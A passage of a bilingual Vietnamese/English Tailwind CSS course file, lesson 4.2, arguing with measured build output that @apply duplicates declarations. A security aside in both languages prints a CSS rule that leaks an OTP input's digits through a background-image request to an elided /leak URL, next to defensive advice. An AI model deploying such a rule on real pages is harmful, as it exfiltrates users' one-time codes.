<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-1-4-chia-nho" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 1.4 — Tư duy theo component</span><span class="lc-sub">Từ bản vẽ tới cây component: tên đến từ đâu</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-13-2-hook-styling" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 13.2 — Custom hook tốt, và styling</span><span class="lc-sub">CSS Modules hay Tailwind — cùng một đánh đổi, nhìn từ phía React</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-2-apply" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.2 — Vì sao @apply PHÁ đúng cái làm nó đáng giá</span><span class="lc-sub">Bài sau: cách chữa "hiển nhiên", đo thật</span></span></a>

<h3>🗂 Thuật ngữ trong bài</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">Class soup (canh lớp)</span><span class="v">Lời phản đối rằng chuỗi tiện ích dài làm mã khó đọc — đúng với 3,1%, không đúng với 82%.</span></div>
  <div class="kv"><span class="k">Distribution (phân bố)</span><span class="v">Đo độ dài MỌI thuộc tính lớp thay vì cãi từ một ảnh chụp ca tệ nhất.</span></div>
  <div class="kv"><span class="k">Missing abstraction (trừu tượng còn thiếu)</span><span class="v">Một danh sách lớp dài làm bốn việc (bố cục, bề mặt, tương tác, responsive) có căn cước mà chưa có tên.</span></div>
  <div class="kv"><span class="k">Repetition over length (lặp lại hơn độ dài)</span><span class="v">Tín hiệu tách thật: bao nhiêu chỗ phải đổi cùng nhau, không phải số ký tự.</span></div>
  <div class="kv"><span class="k">Extraction threshold (ngưỡng tách)</span><span class="v">Dài và dùng 4+ lần → tách; dùng một lần → để yên, độ dài một mình không phải vấn đề.</span></div>
  <div class="kv"><span class="k">Leaf element (thẻ lá)</span><span class="v">Danh sách ngắn một-việc như <code>flex items-center gap-2</code> — bọc thành component thì tốn hơn tiết kiệm.</span></div>
</div>

<h3>📌 Tóm tắt</h3>
<ul><li>Đo được: 82% thuộc tính lớp dưới 80 ký tự; chỉ 3,1% vượt 160 (dài nhất 796).</li><li>Một danh sách lớp vừa dài vừa lặp lại là một component mà tên của nó chưa được viết ra.</li><li>Tách theo sự LẶP LẠI (4+ lần), không theo ĐỘ DÀI — một chuỗi dài một-lần thì ổn.</li><li><code>grep | sort | uniq -c | sort -rn</code> xếp hạng ứng viên theo sự trùng lặp thật sự làm bạn tốn kém.</li></ul>

<h3>Nguồn</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind docs — Reusing styles</span><span class="lc-sub">tailwindcss.com/docs/styling-with-utility-classes#managing-duplication — lập trường chính thức: tách component, dùng đa-con-trỏ của trình soạn thảo, và TRÁNH trừu tượng hoá sớm.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Adam Wathan — CSS Utility Classes and "Separation of Concerns"</span><span class="lc-sub">adamwathan.me/css-utility-classes-and-separation-of-concerns — bài luận lập luận cho cách làm này TRƯỚC khi Tailwind tồn tại, gồm cả phần trình bày trung thực về khi nào cách làm ấy đổ vỡ.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Sandi Metz — The Wrong Abstraction</span><span class="lc-sub">sandimetz.com/blog/2016/1/20/the-wrong-abstraction — vì sao tách QUÁ SỚM tệ hơn trùng lặp, chính là lý lẽ đằng sau cái ngưỡng "dùng 4+ lần" bên trên.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Next.js — ranh giới component trong kho App Router</span><span class="lc-sub">/courses/nextjs/learn${REF} — ranh giới component đặt được ở đâu, và vì sao ranh giới server/client đôi khi RA QUYẾT ĐỊNH tách hộ bạn.</span></span></div>
</div>
`,
    },

    /* ─────────────────────────── 4.2 ─────────────────────────── */
    {
      title: '4.2 — Why @apply undoes the thing that made it worth it|||4.2 — Vì sao @apply PHÁ đúng cái làm nó đáng giá',
      slug: 'tw-4-2-apply',
      type: 'VIDEO',
      description: '`@apply` trông như câu trả lời hiển nhiên cho canh lớp. Đo thật: nó CHÉP nguyên mọi khai báo — `.btn-lg` không THAM CHIẾU `.btn`, nó nội tuyến một bản sao. Kho này dùng nó ĐÚNG 0 lần trong 24.610 dòng CSS.',
      content: `
${G04_2}
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.2</span>
<h2>Why @apply undoes the thing that made it worth it</h2>
<p class="lead">Everyone meeting a long class list reaches for the same idea: pull the utilities into a named CSS class. Tailwind provides <code>@apply</code> to do exactly that, and it is the feature its own maintainers most regret shipping. The reason is visible in one build.</p>

<h3>The measurement</h3>
<pre><code class="language-css">@tailwind components;
@tailwind utilities;

@layer components {
  .btn    { @apply px-4 py-2 rounded bg-blue-500 text-white; }
  .btn-lg { @apply btn px-8; }
}
</code></pre>

<div class="out">.btn {
  border-radius: 0.25rem;
  --tw-bg-opacity: 1;
  background-color: rgb(59 130 246 / var(--tw-bg-opacity, 1));
  padding-left: 1rem;
  padding-right: 1rem;
  padding-top: 0.5rem;
  padding-bottom: 0.5rem;
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1))
}

.btn-lg {
  border-radius: 0.25rem;
  --tw-bg-opacity: 1;
  background-color: rgb(59 130 246 / var(--tw-bg-opacity, 1));
  padding-top: 0.5rem;
  padding-bottom: 0.5rem;
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
  padding-left: 2rem;
  padding-right: 2rem
}
# Tailwind 3.4.19 — real output 14/11/2026: 7 of .btn-lg's 9 declarations are copies of .btn</div>

<p><code>.btn-lg</code> does not <em>reference</em> <code>.btn</code>. It contains a full copy of it — seven of its nine declarations are duplicated bytes. <code>@apply</code> is a macro that inlines declarations at build time, not a mechanism for sharing them.</p>

<div class="callout warn">
<p><strong>This destroys the argument from lesson 0.1.</strong> The whole economic case for utility CSS was that stylesheet size tracks your <em>vocabulary</em>, not your number of use sites — 49,378 class attributes collapsing to 6,169 distinct utilities (lesson 0.1, re-measured 14/11/2026). <code>@apply</code> reverses that exactly: every named class carries its own copy of every declaration, so the stylesheet grows with the number of component classes, precisely like hand-written CSS. You have adopted a tool for its deduplication and then switched off the deduplication.</p>
</div>

<h3>What you give up, item by item</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">deduplication</span><span class="lz-lnote">measured above. Ten component classes sharing a base means ten copies of the base's declarations in the output</span></div>
<div class="lz-layer"><span class="lz-lname">readability at the call site</span><span class="lz-lnote"><code>class="btn"</code> tells you nothing about what the element looks like. You are back to opening a stylesheet to find out — the exact indirection utilities removed</span></div>
<div class="lz-layer"><span class="lz-lname">the conflict model</span><span class="lz-lnote"><code>tailwind-merge</code> knows nothing about <code>.btn</code>, so <code>cn('btn', 'px-8')</code> keeps both and leaves the decision to the stylesheet. Measured: inside <code>@layer components</code> the caller still wins (components come before utilities) — but a class written <em>outside</em> a layer beats the caller, and two custom classes (<code>btn btn-lg</code>) are never merged at all</span></div>
<div class="lz-layer"><span class="lz-lname">safe deletion</span><span class="lz-lnote">deleting an unused utility from a component is free and obvious. Deleting a declaration from <code>.btn</code> risks breaking every element using it, and you cannot tell which without a full-text search</span></div>
<div class="lz-layer"><span class="lz-lname">variants without pain</span><span class="lz-lnote">a <code>.btn</code> that needs a hover state needs a second rule; a component that needs one adds <code>hover:bg-blue-600</code> inline. The CSS-class version reintroduces the naming problem for every state</span></div>
</div>

<h3>What this codebase did instead</h3>
<pre><code class="language-bash">$ grep -c '@apply' src/app/globals.css
</code></pre>

<div class="out">0
</div>

<p><strong>Zero uses across 24,610 lines of CSS.</strong> That is not an accident — the file has 241 lines mentioning <code>.rich-content</code>, written as plain CSS declarations rather than <code>@apply</code>. The team's implicit rule is visible in the number: when CSS is genuinely needed, write CSS; when component styling is needed, write a component.</p>

<div class="callout ok">
<p><strong>The distinction that makes this coherent.</strong> <code>@apply</code> is bad as a <em>component abstraction</em> because components already exist in JSX and do the job better. It is defensible in the narrow case where you cannot put a class in markup at all — styling HTML produced by a markdown renderer or a rich-text editor, where you own the CSS but not the elements. That is precisely the <code>.rich-content</code> case, and even there this repo wrote plain CSS.</p>
</div>

<h3>The comparison, made concrete</h3>
<pre><code class="language-jsx">{/* @apply version — indirection, duplication, no merge support */}
&lt;button className="btn btn-lg"&gt;Save&lt;/button&gt;

{/* component version — same call site brevity, none of the costs */}
&lt;Button size="lg"&gt;Save&lt;/Button&gt;
</code></pre>

<p>Both call sites are short. The difference is everything behind them: the component version keeps utilities deduplicated in the output, keeps <code>cn()</code> working, makes variants a typed prop rather than a naming convention, and lets you read the actual styles by opening one file that is already in your component tree.</p>

<div class="callout warn">
<p><strong>The one honest advantage of <code>@apply</code>, and its limit.</strong> It works without a JavaScript component layer — a plain HTML site, a Rails or Django template, a web component. If your project has no component abstraction to extract into, <code>@apply</code> is a real option and the duplication is a real cost you accept knowingly. In a React codebase with 1,678 component files, that argument does not apply.</p>
</div>

<div class="pitfall">
<p><strong>Trap — <code>@apply</code>-ing a class that is itself made of <code>@apply</code>.</strong> The measurement above shows <code>.btn-lg { @apply btn px-8 }</code> works, which encourages building a hierarchy. Each level copies the level below it, so a three-deep chain triples the declarations, and a change at the root silently rewrites every descendant's output. It reads like inheritance and behaves like copy-paste — the worst combination, because the code implies a relationship the output does not have.</p>
</div>

<div class="callout">
<p><strong>One sentence.</strong> <code>@apply</code> inlines a copy of every declaration rather than referencing them — measured, <code>.btn-lg</code> duplicates seven of <code>.btn</code>'s nine — so it reverses the deduplication that was the entire reason to adopt utility CSS, and in a codebase with a component layer the answer to a long class list is a component, which is why this repository uses <code>@apply</code> exactly zero times.</p>
</div>

<h3>🔬 Measured: Tailwind 4 refuses the same file</h3>
<div class="out">$ npx @tailwindcss/cli -i src/in.css -o ../c42o/v4.css 2&gt;&amp;1 | grep -oE 'Error: Cannot apply[^&#96;]*&#96;[^&#96;]*&#96;'
Error: Cannot apply unknown utility class &#96;btn&#96;
$ npx @tailwindcss/cli -i src/in2.css -o ../c42o/v4b.css 2&gt;&amp;1 | tail -1
Done in 40ms
$ grep -A7 '^  \\.btn-lg {' ../c42o/v4b.css
  .btn-lg {
    border-radius: 0.25rem;
    background-color: var(--color-blue-500);
    padding-inline: calc(var(--spacing) * 4);
    padding-block: calc(var(--spacing) * 2);
    color: var(--color-white);
    padding-inline: calc(var(--spacing) * 8);
  }</div>
<p>In Tailwind 4, <code>@apply</code> only accepts utilities it knows; a class in <code>@layer components</code> is plain CSS to it, so <code>btn</code> is "unknown". Registering it with <code>@utility</code> makes it build — and <code>.btn-lg</code> still carries a full copy, with <code>padding-inline</code> written twice (the ×4 copy, then the ×8 that overrides it). In a CSS Module or a Vue/Svelte <code>&lt;style&gt;</code> block you also need <code>@reference "../app.css";</code> before <code>@apply</code> works.</p>
<h3>🔬 Measured: the stylesheet grows with every @apply class</h3>
<div class="out">$ node phinh.cjs
N= 1  @apply:   477 B   tien ich:   603 B
N= 5  @apply:  1516 B   tien ich:   696 B
N=10  @apply:  2598 B   tien ich:   817 B
N=20  @apply:  5218 B   tien ich:   868 B</div>
<p>N component classes sharing one base (Tailwind 3.4.19, minified): each <code>@apply</code> class adds roughly 260 bytes; the same elements written with utilities only grow when a <em>new</em> utility appears.</p>
<h3>🔬 Measured: who wins when the caller adds a class</h3>
<div class="out">$ grep -nE '^\\.(btn|btn-lg|px-8|px-4|nut-ngoai) \\{' o3.css
557:.btn {
569:.btn-lg {
605:.px-4 {
610:.px-8 {
635:.nut-ngoai {
$ node tm.cjs
"btn px-8"       -&gt; "btn px-8"
"btn-lg px-4"    -&gt; "btn-lg px-4"
"btn btn-lg"     -&gt; "btn btn-lg"</div>
<p>Chromium, padding-left: <code>btn px-8</code> → <strong>32px</strong> (caller wins — <code>.px-8</code> is generated after <code>.btn</code> because utilities follow components); <code>btn-lg px-4</code> → <strong>16px</strong> (caller wins); a class written <em>outside</em> <code>@layer</code> plus <code>px-8</code> → <strong>16px</strong> (the class wins, the caller loses). So <code>twMerge</code> keeping both is survivable only while every custom class stays inside <code>@layer components</code>.</p>
<h3>🔬 Measured: this repository</h3>
<div class="out">$ git grep -c '@apply' -- '*.css' '*.scss' | wc -l
       0
$ git ls-files '*.css' | xargs wc -l | tail -1
   24610 total
$ wc -l src/app/globals.css
    6508 src/app/globals.css
$ grep -c 'rich-content' src/app/globals.css
241</div>
<h3>🌍 In real life, "what if…", and the attacker's view</h3>
<ul><li><strong>Every day:</strong> <code>@apply</code> is pasting a whole paragraph into every essay instead of citing it in a footnote. Change the source and every essay must be rebuilt — and each one got longer.</li>
<li><strong>What if…</strong> you upgrade to Tailwind 4 with a stylesheet full of <code>@apply btn</code>? The build stops with "Cannot apply unknown utility class" until every link of the chain becomes an <code>@utility</code> (measured above).</li>
<li><strong>The attacker's view — CSS is code:</strong> a hijacked CSS package or CDN file needs no JavaScript to leak data. Measured: the rule <code>input[name="otp"][value^="4"] { background-image: url(…/leak?otp=4) }</code> made Chromium send <code>GET /leak?otp=4</code> (type image) — one rule per digit leaks the whole code. Never keep secrets in HTML attributes, review CSS dependencies like JS ones, add Subresource Integrity to CDN stylesheets, and use a Content-Security-Policy <code>img-src</code>/<code>style-src</code> allow-list.</li></ul>
<h3>🔁 Run it yourself</h3>
<pre><code class="language-bash"><span class="tok-comment"># Tailwind 3: does .btn-lg reference .btn or copy it?</span>
printf '@tailwind components;\\n@tailwind utilities;\\n@layer components {\\n.btn { @apply px-4 py-2 rounded bg-blue-500 text-white; }\\n.btn-lg { @apply btn px-8; }\\n}\\n' &gt; in.css
echo '&lt;button class="btn-lg"&gt;&lt;/button&gt;' &gt; nut.html
npx tailwindcss@3 --content ./nut.html -i in.css -o out.css &amp;&amp; cat out.css
<span class="tok-comment"># Tailwind 4: the same idea needs @utility (a custom class in @layer is "unknown" to @apply)</span>
<span class="tok-comment"># your project: how many @apply?</span>
git grep -c '@apply' -- '*.css' '*.scss'</code></pre>
<h3>🔗 Go deeper</h3>
<a class="link-card lien-ket-cheo" href="/courses/nodejs/learn?lessonSlug=nodejs-4-3-bao-mat-npm" target="_blank" rel="noopener"><span class="lc-ico">🟩</span><span class="lc-body"><span class="lc-title">Node.js · 4.3 — Supply-chain safety</span><span class="lc-sub">A stylesheet from a package or CDN is code too</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/react/learn?lessonSlug=rx-13-2-hook-styling" target="_blank" rel="noopener"><span class="lc-ico">⚛️</span><span class="lc-body"><span class="lc-title">React · 13.2 — Good custom hooks, and styling</span><span class="lc-sub">CSS Modules or Tailwind — and where @reference comes in</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-7-1-strip-layer" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 7.1 — Tailwind strips @layer</span><span class="lc-sub">Why a class outside a layer beats your utilities</span></span></a>
<a class="link-card lien-ket-cheo" href="/courses/tailwind-css/learn?lessonSlug=tw-4-3-hop-dong" target="_blank" rel="noopener"><span class="lc-ico">💨</span><span class="lc-body"><span class="lc-title">Tailwind CSS · 4.3 — The className prop is a contract</span><span class="lc-sub">Next lesson: the component version, done properly</span></span></a>

<h3>🗂 Key terms</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">@apply</span><span class="v">A directive that inlines a copy of each utility's declarations into a CSS class — a macro, not a reference.</span></div>
  <div class="kv"><span class="k">Inlining / macro</span><span class="v">Why <code>.btn-lg</code> duplicates seven of <code>.btn</code>'s nine declarations rather than sharing them.</span></div>
  <div class="kv"><span class="k">Deduplication</span><span class="v">The property utility CSS relies on — stylesheet size tracks vocabulary, not use sites — that <code>@apply</code> reverses.</span></div>
  <div class="kv"><span class="k">tailwind-merge</span><span class="v">The conflict resolver that knows nothing about a custom <code>.btn</code>, so <code>cn('btn','px-8')</code> stops working.</span></div>
  <div class="kv"><span class="k">.rich-content</span><span class="v">The one legitimate case (CSS for renderer-produced HTML) — and this repo still wrote plain CSS, not <code>@apply</code>.</span></div>
</div>

<h3>📌 Summary</h3>
<ul><li><code>@apply</code> inlines a full copy of every declaration; it does not reference the base class.</li><li>That reverses the deduplication that was the whole economic case for utility CSS.</li><li>It also breaks <code>cn()</code> merging, safe deletion, and cheap variants.</li><li>This repo uses <code>@apply</code> zero times across 24,610 lines of CSS — defensible only when there is no component layer.</li></ul>

<h3>Sources</h3>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind docs — the @apply directive</span><span class="lc-sub">tailwindcss.com/docs/functions-and-directives#apply — including the documentation's own warning against using it to build component libraries.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Adam Wathan — "@apply is a mistake"</span><span class="lc-sub">The Tailwind creator's public position that <code>@apply</code> exists mainly to make the transition easier and should not be the destination. Worth reading as the maintainers' own retrospective.</span></span></div>
<div class="link-card"><span class="lc-ico">📄</span><span class="lc-body"><span class="lc-title">Tailwind docs — Reusing styles</span><span class="lc-sub">tailwindcss.com/docs/styling-with-utility-classes#managing-duplication — the recommended alternatives in order: multi-cursor editing, loops, and component extraction.</span></span></div>
<div class="link-card codelab"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Chapter 7 — @layer, and where custom CSS does belong</span><span class="lc-sub">/courses/tailwind-css/learn${REF} — the cases where writing real CSS is correct, and how to place it so it does not fight your utilities.</span></span></div>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.2</span>
<h2>Vì sao @apply PHÁ đúng cái làm nó đáng giá</h2>
<p class="lead">Ai gặp một danh sách lớp dài cũng với tay tới cùng một ý: KÉO các tiện ích vào một lớp CSS có tên. Tailwind cung cấp <code>@apply</code> để làm đúng thế, và nó là tính năng mà chính những người bảo trì HỐI TIẾC nhất vì đã giao. Lý do nhìn thấy được trong MỘT lần dựng.</p>

<h3>Phép đo</h3>
<pre><code class="language-css">@tailwind components;
@tailwind utilities;

@layer components {
  .btn    { @apply px-4 py-2 rounded bg-blue-500 text-white; }
  .btn-lg { @apply btn px-8; }
}
</code></pre>

<div class="out">.btn {
  border-radius: 0.25rem;
  --tw-bg-opacity: 1;
  background-color: rgb(59 130 246 / var(--tw-bg-opacity, 1));
  padding-left: 1rem;
  padding-right: 1rem;
  padding-top: 0.5rem;
  padding-bottom: 0.5rem;
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1))
}

.btn-lg {
  border-radius: 0.25rem;
  --tw-bg-opacity: 1;
  background-color: rgb(59 130 246 / var(--tw-bg-opacity, 1));
  padding-top: 0.5rem;
  padding-bottom: 0.5rem;
  --tw-text-opacity: 1;
  color: rgb(255 255 255 / var(--tw-text-opacity, 1));
  padding-left: 2rem;
  padding-right: 2rem
}
# Tailwind 3.4.19 — đầu ra thật 14/11/2026: 7 trên 9 khai báo của .btn-lg là bản sao của .btn</div>

<p><code>.btn-lg</code> KHÔNG <em>THAM CHIẾU</em> <code>.btn</code>. Nó CHỨA một bản sao đầy đủ của nó — bảy trên chín khai báo là những byte TRÙNG LẶP. <code>@apply</code> là một MACRO nội tuyến các khai báo lúc dựng, không phải một cơ chế để CHIA SẺ chúng.</p>

<div class="callout warn">
<p><strong>Chuyện này PHÁ HUỶ lập luận ở bài 0.1.</strong> Toàn bộ luận điểm kinh tế của CSS tiện ích là kích thước bảng kiểu bám theo <em>VỐN TỪ</em> của bạn, không bám theo số CHỖ DÙNG — 49.378 thuộc tính lớp gói lại còn 6.169 tiện ích khác nhau (bài 0.1, đo lại 14/11/2026). <code>@apply</code> ĐẢO NGƯỢC đúng cái đó: mỗi lớp có tên mang bản sao riêng của mọi khai báo, nên bảng kiểu PHÌNH theo số lớp component, y hệt CSS viết tay. Bạn đã nhận một công cụ VÌ khả năng khử trùng lặp của nó rồi TẮT khả năng khử trùng lặp đi.</p>
</div>

<h3>Bạn đánh mất gì, từng món</h3>
<div class="lz-stack">
<div class="lz-layer"><span class="lz-lname">khử trùng lặp</span><span class="lz-lnote">đo được bên trên. Mười lớp component chung một nền nghĩa là MƯỜI bản sao các khai báo của cái nền ấy trong đầu ra</span></div>
<div class="lz-layer"><span class="lz-lname">tính đọc-được TẠI CHỖ GỌI</span><span class="lz-lnote"><code>class="btn"</code> không nói gì cho bạn về việc cái thẻ trông ra sao. Bạn quay lại việc mở một bảng kiểu để tìm hiểu — chính xác cú gián tiếp mà tiện ích đã gỡ bỏ</span></div>
<div class="lz-layer"><span class="lz-lname">mô hình xung đột</span><span class="lz-lnote"><code>tailwind-merge</code> không biết gì về <code>.btn</code>, nên <code>cn('btn', 'px-8')</code> giữ CẢ HAI và để bảng kiểu phân xử. Đo thật: trong <code>@layer components</code> người gọi VẪN thắng (component đứng trước tiện ích) — nhưng lớp viết <em>NGOÀI</em> tầng thì thắng người gọi, và hai lớp tự đặt (<code>btn btn-lg</code>) không bao giờ được gộp</span></div>
<div class="lz-layer"><span class="lz-lname">xoá được an toàn</span><span class="lz-lnote">xoá một tiện ích không dùng khỏi một component thì miễn phí và hiển nhiên. Xoá một khai báo khỏi <code>.btn</code> có RỦI RO làm vỡ mọi thẻ đang dùng nó, và bạn không biết là những thẻ nào nếu không tìm toàn văn</span></div>
<div class="lz-layer"><span class="lz-lname">biến thể mà không đau</span><span class="lz-lnote">một <code>.btn</code> cần trạng thái hover thì cần một quy tắc THỨ HAI; một component cần nó thì thêm <code>hover:bg-blue-600</code> ngay trong dòng. Bản lớp-CSS TÁI SINH bài toán đặt tên cho MỌI trạng thái</span></div>
</div>

<h3>Kho mã này đã làm gì thay vào đó</h3>
<pre><code class="language-bash">$ grep -c '@apply' src/app/globals.css
</code></pre>

<div class="out">0
</div>

<p><strong>KHÔNG lượt nào trên 24.610 dòng CSS.</strong> Đó KHÔNG phải tai nạn — file ấy có 241 dòng nhắc tới <code>.rich-content</code>, viết dưới dạng khai báo CSS THUẦN chứ không dùng <code>@apply</code>. Luật ngầm của đội ngũ nhìn thấy được trong con số: khi THẬT SỰ cần CSS thì viết CSS; khi cần tạo kiểu component thì viết một COMPONENT.</p>

<div class="callout ok">
<p><strong>Sự phân biệt làm cho chuyện này mạch lạc.</strong> <code>@apply</code> TỆ với vai trò một <em>SỰ TRỪU TƯỢNG COMPONENT</em> vì component ĐÃ tồn tại trong JSX và làm việc ấy tốt hơn. Nó BIỆN HỘ ĐƯỢC ở ca hẹp mà bạn KHÔNG THỂ đặt một lớp vào mã đánh dấu chút nào — tạo kiểu cho HTML sinh ra bởi một bộ dựng markdown hay một trình soạn thảo văn bản, nơi bạn sở hữu CSS nhưng không sở hữu các thẻ. Đó CHÍNH XÁC là ca <code>.rich-content</code>, và ngay cả ở đó kho này vẫn viết CSS thuần.</p>
</div>

<h3>So sánh, cho cụ thể</h3>
<pre><code class="language-jsx">{/* ban @apply — gian tiep, trung lap, khong ho tro merge */}
&lt;button className="btn btn-lg"&gt;Luu&lt;/button&gt;

{/* ban component — cung do ngan gon tai cho goi, khong cai gia nao */}
&lt;Button size="lg"&gt;Luu&lt;/Button&gt;
</code></pre>

<p>Cả hai chỗ gọi đều NGẮN. Khác biệt nằm ở TẤT CẢ những gì đằng sau chúng: bản component giữ tiện ích được khử trùng lặp trong đầu ra, giữ <code>cn()</code> chạy được, biến biến thể thành một PROP CÓ KIỂU chứ không phải một quy ước đặt tên, và cho bạn đọc kiểu dáng THẬT bằng cách mở MỘT file vốn đã nằm trong cây component của bạn.</p>

<div class="callout warn">
<p><strong>Lợi thế TRUNG THỰC duy nhất của <code>@apply</code>, và giới hạn của nó.</strong> Nó chạy được KHÔNG cần một tầng component JavaScript — một trang HTML thuần, một template Rails hay Django, một web component. Nếu dự án của bạn KHÔNG có một trừu tượng component nào để tách vào, thì <code>@apply</code> là một lựa chọn THẬT và sự trùng lặp là một cái giá thật bạn chấp nhận một cách CÓ Ý THỨC. Trong một kho mã React với 1.678 tệp component, lập luận ấy KHÔNG áp dụng.</p>
</div>

<div class="pitfall">
<p><strong>Bẫy — <code>@apply</code> một lớp mà bản thân nó cũng làm bằng <code>@apply</code>.</strong> Phép đo bên trên cho thấy <code>.btn-lg { @apply btn px-8 }</code> CHẠY ĐƯỢC, thứ khuyến khích dựng một hệ phân cấp. Mỗi tầng CHÉP tầng dưới nó, nên một chuỗi ba tầng nhân ba số khai báo, và một thay đổi ở gốc ÂM THẦM viết lại đầu ra của mọi hậu duệ. Nó ĐỌC như kế thừa và HÀNH XỬ như chép-dán — tổ hợp TỆ NHẤT, vì mã ngụ ý một quan hệ mà đầu ra KHÔNG hề có.</p>
</div>

<div class="callout">
<p><strong>Một câu.</strong> <code>@apply</code> NỘI TUYẾN một bản sao của mọi khai báo thay vì tham chiếu chúng — đo được, <code>.btn-lg</code> chép trùng bảy trên chín khai báo của <code>.btn</code> — nên nó ĐẢO NGƯỢC khả năng khử trùng lặp vốn là toàn bộ lý do nhận CSS tiện ích, và trong một kho mã có tầng component thì câu trả lời cho một danh sách lớp dài là một COMPONENT, đó là lý do kho này dùng <code>@apply</code> đúng KHÔNG lần.</p>
</div>

<h3>🔬 Đo thật: Tailwind 4 từ chối đúng tệp đó</h3>
<div class="out">$ npx @tailwindcss/cli -i src/in.css -o ../c42o/v4.css 2&gt;&amp;1 | grep -oE 'Error: Cannot apply[^&#96;]*&#96;[^&#96;]*&#96;'
Error: Cannot apply unknown utility class &#96;btn&#96;
$ npx @tailwindcss/cli -i src/in2.css -o ../c42o/v4b.css 2&gt;&amp;1 | tail -1
Done in 40ms
$ grep -A7 '^  \\.btn-lg {' ../c42o/v4b.css
  .btn-lg {
    border-radius: 0.25rem;
    background-color: var(--color-blue-500);
    padding-inline: calc(var(--spacing) * 4);
    padding-block: calc(var(--spacing) * 2);
    color: var(--color-white);
    padding-inline: calc(var(--spacing) * 8);
  }</div>
<p>Ở Tailwind 4, <code>@apply</code> chỉ nhận lớp tiện ích nó biết; một lớp trong <code>@layer components</code> chỉ là CSS thường với nó, nên <code>btn</code> là "lạ". Khai bằng <code>@utility</code> thì dựng được — và <code>.btn-lg</code> vẫn mang nguyên bản sao, <code>padding-inline</code> xuất hiện HAI lần (bản ×4 chép sang, rồi bản ×8 đè lên). Trong CSS Module hay khối <code>&lt;style&gt;</code> của Vue/Svelte còn phải khai <code>@reference "../app.css";</code> thì <code>@apply</code> mới chạy.</p>
<h3>🔬 Đo thật: bảng kiểu lớn theo từng lớp @apply</h3>
<div class="out">$ node phinh.cjs
N= 1  @apply:   477 B   tien ich:   603 B
N= 5  @apply:  1516 B   tien ich:   696 B
N=10  @apply:  2598 B   tien ich:   817 B
N=20  @apply:  5218 B   tien ich:   868 B</div>
<p>N lớp component chung một nền (Tailwind 3.4.19, đã minify): mỗi lớp <code>@apply</code> thêm khoảng 260 byte; cùng các thẻ ấy viết bằng tiện ích chỉ lớn thêm khi xuất hiện một tiện ích <em>mới</em>.</p>
<h3>🔬 Đo thật: ai thắng khi người gọi thêm lớp</h3>
<div class="out">$ grep -nE '^\\.(btn|btn-lg|px-8|px-4|nut-ngoai) \\{' o3.css
557:.btn {
569:.btn-lg {
605:.px-4 {
610:.px-8 {
635:.nut-ngoai {
$ node tm.cjs
"btn px-8"       -&gt; "btn px-8"
"btn-lg px-4"    -&gt; "btn-lg px-4"
"btn btn-lg"     -&gt; "btn btn-lg"</div>
<p>Chromium, padding-left: <code>btn px-8</code> → <strong>32px</strong> (người gọi thắng — <code>.px-8</code> sinh sau <code>.btn</code> vì tiện ích đứng sau component); <code>btn-lg px-4</code> → <strong>16px</strong> (người gọi thắng); lớp viết <em>NGOÀI</em> <code>@layer</code> cộng <code>px-8</code> → <strong>16px</strong> (lớp tự viết thắng, người gọi thua). Vậy <code>twMerge</code> giữ cả hai chỉ còn chịu được khi mọi lớp tự đặt nằm trong <code>@layer components</code>.</p>
<h3>🔬 Đo thật: kho này</h3>
<div class="out">$ git grep -c '@apply' -- '*.css' '*.scss' | wc -l
       0
$ git ls-files '*.css' | xargs wc -l | tail -1
   24610 total
$ wc -l src/app/globals.css
    6508 src/app/globals.css
$ grep -c 'rich-content' src/app/globals.css
241</div>
<h3>🌍 Ngoài đời, "nếu… thì sao", và góc kẻ xấu</h3>
<ul><li><strong>Ngoài đời:</strong> <code>@apply</code> giống dán nguyên đoạn văn vào mọi bài luận thay vì ghi chú nguồn. Đổi nguồn là phải dựng lại mọi bài — và bài nào cũng dài thêm.</li>
<li><strong>Nếu… thì sao:</strong> nâng lên Tailwind 4 với bảng kiểu đầy <code>@apply btn</code>? Bản dựng dừng với "Cannot apply unknown utility class" cho tới khi mọi mắt xích thành <code>@utility</code> (đo ở trên).</li>
<li><strong>Góc kẻ xấu — CSS cũng là mã:</strong> một gói CSS hay tệp CDN bị chiếm quyền không cần dòng JavaScript nào để làm rò dữ liệu. Đo thật: luật <code>input[name="otp"][value^="4"] { background-image: url(…/leak?otp=4) }</code> khiến Chromium gửi <code>GET /leak?otp=4</code> (loại image) — mỗi chữ số một luật là rò cả mã. Đừng để bí mật trong thuộc tính HTML, duyệt gói CSS như gói JS, thêm Subresource Integrity cho bảng kiểu từ CDN, và dùng Content-Security-Policy <code>img-src</code>/<code>style-src</code> dạng danh sách cho phép.</li></ul>
<h3>🔁 Tự chạy lại</h3>
<pre><code class="language-bash"><span class="tok-comment"># Tailwind 3: .btn-lg trỏ về .btn hay chép nó?</span>
